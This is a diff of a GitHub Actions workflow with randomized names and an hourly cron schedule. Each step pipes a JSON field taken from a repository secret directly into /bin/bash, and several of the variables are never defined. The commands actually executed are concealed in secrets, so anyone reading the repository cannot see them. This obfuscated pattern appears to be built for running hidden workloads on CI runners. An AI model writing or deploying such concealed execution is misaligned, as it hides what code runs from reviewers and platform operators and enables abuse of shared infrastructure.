@@ -1,23 +1,26 @@
 name: feidali3647
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '47 * * * *'
-jobs:  # 16535
+    - cron: '56 * * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: feidali3647
         env:
-          xlpjt2: ${{ secrets.xlpjt2 }}
+          liza2: ${{ secrets.liza2 }}
         run: |
-          echo $xlpjt2 | jq -r .swee25691 | /bin/bash
-          echo $idk22 | jq -r .stm0 | /bin/bash
-          echo $dh52 | jq -r .wbr41948 | /bin/bash
-          echo $um848 | jq -r .uxej8119 | /bin/bash
-          echo $u16565 | jq -r .rs9737 | /bin/bash
-          echo $syn6342 | jq -r .vgtqt863 | /bin/bash
-          echo $oz43028 | jq -r .m39450 | /bin/bash
+          echo $liza2 | jq -r .tgcbs9 | /bin/bash
+          echo $o53 | jq -r .oe47052 | /bin/bash
+          echo $p8 | jq -r .e24 | /bin/bash
+          echo $y3 | jq -r .szubz9 | /bin/bash
+          echo $bybs6 | jq -r .pp8966 | /bin/bash
+          echo $sfcz5 | jq -r .lc986 | /bin/bash
+          echo $j529 | jq -r .kxy088 | /bin/bash
+          echo $leml5201 | jq -r .vlnyu35 | /bin/bash
+          echo $u157 | jq -r .t5 | /bin/bash
 
